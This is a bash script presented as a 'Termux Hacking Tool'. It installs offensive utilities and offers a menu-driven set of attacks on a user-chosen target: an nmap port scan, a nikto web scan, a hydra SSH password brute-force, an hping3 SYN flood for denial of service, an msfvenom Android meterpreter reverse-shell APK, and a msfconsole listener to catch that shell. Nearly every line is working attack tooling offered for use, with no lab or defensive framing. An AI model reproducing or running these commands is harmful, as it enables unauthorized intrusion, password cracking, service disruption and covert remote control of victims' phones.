#!/bin/bash

# Function to install required tools
install_tools() {
  packages=("nmap" "nikto" "hydra" "hping3" "msfvenom" "msfconsole")
  for package in "${packages[@]}"; do
    if ! command -v $package &> /dev/null; then
      echo "Installing $package..."
      apt-get install $package -y &> /dev/null &
      pid=$!
      while kill -0 $pid 2>/dev/null; do
        printf "\r\033[0;31m#\033[0m\033[0;33m#\033[0m\033[0;32m#\033[0m\033[0;36m#\033[0m\033[0;34m#\033[0m\033[0;35m#\033[0m"
        sleep 0.2
        printf "\r\033[0;35m#\033[0m\033[0;31m#\033[0m\033[0;33m#\033[0m\033[0;32m#\033[0m\033[0;36m#\033[0m\033[0;34m#\033[0m"
        sleep 0.2
      done
      echo "\r$package installed successfully!"
    fi
  done
}

# Function to perform a port scan
port_scan() {
  echo "Enter the target IP address:"
  read ip
  echo "Enter the port range (e.g., 1-1000):"
  read ports
  nmap -sV -p$ports $ip
}

# Function to perform a vulnerability scan
vuln_scan() {
  echo "Enter the target URL:"
  read url
  nikto -h $url
}

# Function to perform a brute-force attack on SSH
ssh_brute() {
  echo "Enter the target IP address:"
  read ip
  echo "Enter the username:"
  read user
  echo "Enter the path to the password list:"
  read passlist
  hydra -l $user -P $passlist $ip ssh
}

# Function to perform a denial-of-service attack
dos_attack() {
  echo "Enter the target IP address:"
  read ip
  echo "Enter the number of packets to send:"
  read count
  hping3 -c $count -d 65535 -S $ip
}

# Function to create a reverse shell payload
create_payload() {
  echo "Enter the attacker's IP address:"
  read lhost
  echo "Enter the listening port:"
  read lport
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > payload.apk
}

# Function to start a listener for the reverse shell
start_listener() {
  echo "Enter the listening port:"
  read lport
  msfconsole -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LPORT $lport; run"
}

# Install required tools
install_tools

# Main menu
while true; do
  echo "Termux Hacking Tool"
  echo "1. Port Scan"
  echo "2. Vulnerability Scan"
  echo "3. SSH Brute-Force"
  echo "4. Denial-of-Service Attack"
  echo "5. Create Payload"
  echo "6. Start Listener"
  echo "7. Exit"
  read -p "Enter your choice: " choice

  case $choice in
    1)
      port_scan
      ;;
    2)
      vuln_scan
      ;;
    3)
      ssh_brute
      ;;
    4)
      dos_attack
      ;;
    5)
      create_payload
      ;;
    6)
      start_listener
      ;;
    7)
      exit 0
      ;;
    *)
      echo "Invalid choice. Please try again."
      ;;
  esac
done
